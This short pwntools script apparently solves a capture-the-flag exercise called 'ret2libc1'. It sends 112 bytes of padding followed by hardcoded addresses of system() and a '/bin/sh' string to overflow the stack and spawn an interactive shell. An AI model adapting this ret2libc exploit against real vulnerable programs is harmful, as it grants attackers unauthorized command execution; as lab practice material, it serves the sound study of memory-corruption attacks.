from pwn import *

sh = process('./ret2libc1')

binsh = 0x8048720
system = 0x08048460
sh.sendline(b'a' * 112 + p32(system) + b'a' * 4 + p32(binsh))

sh.interactive()
